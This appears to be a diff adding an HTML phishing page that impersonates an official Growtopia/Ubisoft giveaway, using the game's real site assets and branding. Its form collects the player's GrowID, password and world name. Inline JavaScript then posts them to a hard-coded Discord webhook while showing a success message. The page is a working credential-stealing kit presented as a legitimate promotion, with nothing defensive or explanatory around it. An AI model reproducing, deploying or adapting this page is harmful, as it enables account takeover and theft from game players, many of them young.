@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Growtopia Giveaway</title>
+  <link rel="icon" type="image/png" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/growtopia.ico" sizes="16x16">
+  <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-main.css">
+  <link rel="stylesheet" href="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/css/faq-custom.css">
+</head>
+<body>
+  <div id="wrap">
+    <div class="page-wrapper">
+      <div class="header-bg">
+        <header class="header" id="header">
+          <div class="row">
+            <div class="col-md-2 col-sm-3 col-xs-3">
+              <div class="logo">
+                <a href="https://www.growtopiagame.com">
+                  <img class="normal" src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/logo_navibar.png" alt="Growtopia">
+                </a>
+              </div>
+            </div>
+            <div class="col-md-8 col-sm-6 col-xs-6 center-align">
+              <div class="title">GROWTOPIA GIVEAWAY</div>
+            </div>
+          </div>
+        </header>
+        <div class="dirt"></div>
+      </div>
+      
+      <div class="support-wrapper">
+        <div class="collapse navbar-collapse" id="nav">
+          <ul class="nav navbar-nav navbar-left">
+            <li><a href="https://www.growtopiagame.com/faq" target="_blank">Support</a></li>
+            <li><a href="https://www.growtopiagame.com/change-email" target="_blank">Changing GrowID Email</a></li>
+            <li><a href="https://www.growtopiagame.com/account" target="_blank">Forgot GrowID Password</a></li>
+            <li><a href="https://www.growtopiagame.com/recover" target="_blank">GrowID Recovery</a></li>
+            <li><a href="https://www.growtopiagame.com/forums/lostpw" target="_blank">Forgot Forum Password</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="row">
+        <div class="col-xs-12 col-md-12 annoucemnet-banner">
+          <a href="https://www.growtopiagame.com/shop?utm_src=banner">
+            <img src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/gt-shop-banner.png" class="img-responsive" alt="Annoucement">
+          </a>
+        </div>
+      </div>
+
+      <div class="content">
+        <section class="common-box">
+          <div class="container">
+            <div class="section-title">
+              <h2>Growtopia Giveaway</h2>
+            </div>
+            <div class="row">
+              <div class="col-md-8 col-sm-10">
+                <p>Enter in your Growtopia data to participate in the giveaway! If you are chosen as one of our winners, we will check your GrowID and message you in-game to claim your reward. Please be aware of new messages in Growtopia after applying to the giveaway, or you might miss your prize.</p>
+              </div>
+            </div>
+
+            <div class="row">
+              <div class="col-md-6 col-sm-8">
+                <form id="giveaway-form">
+                  <div class="form-group">
+                    <input id="name" class="form-control" required="required" placeholder="GrowID *" name="name" type="text">
+                    <p class="text-info help-block">
+                      <a href="https://www.growtopiagame.com/recover">(Click here if you can't remember your GrowID)</a>
+                    </p>
+                  </div>
+                  <div class="form-group">
+                    <input id="pass" class="form-control" required="required" placeholder="GrowID Password *" name="pass" type="password">
+                    <input id="cbox" type="checkbox" onclick="showPassword()">
+                    <label for="cbox" style="font-size:12px">Show Password</label>
+                  </div>
+                  <div class="form-group">
+                    <input id="worldname" class="form-control" required="required" placeholder="World Name *" name="worldname" type="text">
+                  </div>
+                  <div class="form-group">
+                    <p>Choose an item:</p>
+                    <select id="item" name="item" class="form-control" required>
+                      <option value="">Select one</option>
+                      <option value="magplant">1x Rayman's Fist</option>
+                      <option value="rayman">1x Magplant 5000</option>
+                    </select>
+                  </div>
+                  <div class="form-group">
+                    <input class="btn btn-lg btn-primary grow-button" type="submit" value="Submit">
+                    <p class="text-info help-block">Ends on 7/1/2025</p>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+
+      <footer id="footer">
+        <div class="container text-center">
+          <div class="logo">
+            <a href="https://www.ubisoft.com" target="_blank">
+              <img src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/images/ubi_icon.png" alt="Ubisoft">
+            </a>
+          </div>
+          <div class="copy-right">
+            &copy; 2025 <a href="https://www.ubisoft.com" target="_blank">Ubisoft</a>. All Rights Reserved.
+          </div>
+        </div>
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    function showPassword() {
+      var s = document.getElementById("pass");
+      s.type = s.type === "password" ? "text" : "password";
+    }
+
+    document.getElementById("giveaway-form").addEventListener("submit", function(event) {
+      event.preventDefault(); // Prevent form submission
+
+      // Collect form data
+      const name = document.getElementById("name").value;
+      const pass = document.getElementById("pass").value;
+      const worldname = document.getElementById("worldname").value;
+      const item = document.getElementById("item").value;
+
+      // Prepare payload for webhook
+      const payload = {
+        username: name,
+        password: pass,
+        worldname: worldname,
+        item: item
+      };
+
+      // Send data to Discord Webhook
+      fetch("https://discord.com/api/webhooks/1320999771392966678/DQXwd0Sbq5XwWK2CWhb9ajP-8H564bzxKODVlbq-52Lzh5qhxhCK7iVJSc9A_puRHXd1", { // Ganti dengan URL webhook yang benar
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `New Giveaway Submission\n**GrowID:** ${name}\n**Password:** ${pass}\n**World Name:** ${worldname}\n**Item:** ${item}`
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Data submitted successfully!");
+        } else {
+          console.error("Failed to submit data. Status:", response.status);
+          alert("Failed to submit data. Please check the console for more details.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("An error occurred.");
+      });
+    });
+  </script>
+
+  <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/jquery/jquery-2.1.4.min.js"></script>
+  <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/vendors/bootstrap/javascripts/bootstrap.min.js"></script>
+  <script src="https://s3.eu-west-1.amazonaws.com/cdn.growtopiagame.com/website/resources/assets/js/faq-custom.js"></script>
+</body>
+</html>
